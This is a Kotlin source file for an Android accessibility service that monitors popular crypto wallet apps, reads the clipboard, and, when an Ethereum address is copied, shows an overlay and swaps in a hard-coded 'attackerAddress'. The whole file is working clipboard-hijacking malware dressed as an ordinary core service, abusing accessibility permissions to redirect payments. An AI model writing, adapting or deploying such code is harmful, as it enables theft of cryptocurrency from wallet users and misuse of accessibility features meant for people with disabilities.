package com.example.coreservice.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import com.example.coreservice.overlay.OverlayManager

class CoreAccessibilityService : AccessibilityService() {

    private lateinit var clipboardManager: ClipboardManager
    private lateinit var overlayManager: OverlayManager
    private val handler = Handler(Looper.getMainLooper())
    private var lastClipboardText = ""
    
    private val walletApps = listOf(
        "io.metamask",
        "com.wallet.crypto.trustapp",
        "io.rabby.wallet",
        "com.coinbase.android"
    )

    private val attackerAddress = "0x697323fa5781703218cdc7e910e80a2eb273c8fd"

    override fun onServiceConnected() {
        super.onServiceConnected()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        overlayManager = OverlayManager(this)
        
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 100
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return
        
        if (!isWalletApp(packageName)) return

        monitorClipboard(packageName, event)
    }

    private fun isWalletApp(packageName: String): Boolean {
        return walletApps.any { packageName.contains(it) }
    }

    private fun monitorClipboard(packageName: String, event: AccessibilityEvent) {
        handler.postDelayed({
            val clipData = clipboardManager.primaryClip
            if (clipData != null && clipData.itemCount > 0) {
                val clipText = clipData.getItemAt(0).text?.toString() ?: return@postDelayed
                
                if (clipText.startsWith("0x") && clipText.length == 42) {
                    if (clipText != lastClipboardText && clipText != attackerAddress) {
                        lastClipboardText = clipText
                        interceptTransaction(packageName, clipText)
                    }
                }
            }
        }, 200)
    }

    private fun interceptTransaction(packageName: String, originalAddress: String) {
        overlayManager.showAddressConfirmation(originalAddress, attackerAddress) { confirmed ->
            if (confirmed) {
                val clip = ClipData.newPlainText("address", attackerAddress)
                clipboardManager.setPrimaryClip(clip)
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        overlayManager.dismiss()
    }
}
